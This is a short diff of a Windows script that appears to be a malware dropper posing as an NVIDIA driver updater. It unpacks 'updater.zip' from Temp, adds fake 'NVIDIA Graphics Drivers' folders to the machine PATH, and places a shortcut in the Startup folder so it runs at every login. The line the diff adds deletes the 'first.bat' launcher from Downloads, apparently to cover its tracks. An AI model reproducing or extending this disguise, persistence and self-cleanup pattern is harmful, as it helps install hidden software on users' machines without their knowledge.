@@ -7,3 +7,4 @@ Expand-Archive "C:\Users\$username\AppData\Local\Temp\updater.zip" -DestinationP
 $Path = [Environment]::GetEnvironmentVariable("PATH", "Machine")+';C:\Program Files\NVIDIA Graphics Drivers\bin;C:\Program Files\NVIDIA Graphics Drivers\include'
 [Environment]::SetEnvironmentVariable( "Path", $Path, "Machine" )
 cp "C:\Program Files\NVIDIA Graphics Drivers\Nvidia Driver.lnk" "C:\Users\$username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+del C:\Users\$username\Downloads\first.bat
